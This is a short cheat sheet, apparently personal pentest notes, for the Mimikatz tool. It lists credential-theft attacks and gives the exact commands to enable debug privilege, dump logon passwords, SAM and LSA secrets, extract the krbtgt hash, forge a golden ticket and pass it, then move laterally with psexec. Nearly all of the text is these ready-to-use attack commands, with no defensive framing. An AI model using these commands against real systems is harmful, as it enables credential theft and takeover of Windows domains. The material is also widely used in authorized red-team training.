https://github.com/gentilkiwi/mimikatz

# Overview

  - Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
  - Dumps credentials stored in memory.
  - Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket


# commands

module to bypass memory protection
```
privilege::debug
```

```
sekurlsa::logonpasswords
```
*Sam dumping*
```
lsadump::sam (to dump sam file)
lsadump::sam /patch
```
*LSA dumping*
```
lsadump::lsa /patch dumping lsa
```

*Golden Ticket*
```
lsadump::lsa /inject /name:krbtgt (filter wanted user name)
Copy SID of the domain and kerberos NTLM hash
kerberos:golden /User:Administrator or any name /domain:DOMAIN /sid:SID /krbtgt:NTLM HASH /id:500 /ptt (pass the ticket)

misc::cmd (open command line with session we created)

command \\COMPUTER\SHARE or file
e.g.
psexec \\ESabah cmd.exe
 
```